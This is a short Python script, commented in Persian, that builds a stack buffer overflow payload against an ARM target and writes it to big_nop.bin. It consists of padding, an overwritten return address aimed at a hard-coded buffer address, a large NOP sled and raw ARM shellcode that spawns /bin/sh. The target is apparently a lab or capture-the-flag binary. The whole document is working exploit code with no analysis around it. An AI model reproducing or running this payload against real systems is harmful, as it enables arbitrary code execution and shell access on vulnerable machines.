import struct

offset = 68
buf = 0xb6fb4198 + 100  # 100 بایت بعد از بافر

shellcode = (
    b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40"
    b"\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e"
    b"\x2f\x73\x68\x00"
)

nop = b"\x00\x00\xa0\xe1"  # mov r0, r0

payload = b"A" * offset
payload += struct.pack("<I", buf + 50)  # وسط NOP sled
payload += nop * 100  # NOP sled بزرگ
payload += shellcode

with open("big_nop.bin", "wb") as f:
    f.write(payload)
